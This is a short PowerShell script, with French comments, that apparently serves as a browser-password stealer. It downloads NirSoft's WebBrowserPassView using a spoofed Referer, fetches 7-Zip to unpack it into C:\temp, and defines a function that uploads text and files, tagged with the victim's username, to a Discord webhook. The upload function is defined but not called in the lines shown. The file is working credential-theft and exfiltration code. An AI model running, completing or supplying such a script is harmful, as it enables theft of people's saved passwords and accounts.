function TempDir {
# Vérifier si le dossier C:\temp existe
if (Test-Path -Path "C:\temp" -PathType Container) {
    # Le dossier existe

    # Vérifier si le dossier actuel est C:\temp
    if (-not (Get-Location).Path -eq "C:\temp") {
        # Si ce n'est pas le cas, changer de répertoire
        Set-Location -Path "C:\temp"
    }
} else {
    # Le dossier n'existe pas, le créer et changer de répertoire
    New-Item -Path "C:\" -Name "temp" -ItemType Directory
    Set-Location -Path "C:\temp"
}
}

function Get-Nirsoft {
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
    Expand-Archive 7z.zip
    .\7z\7za.exe e wbpv.zip
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

TempDir
Get-Nirsoft
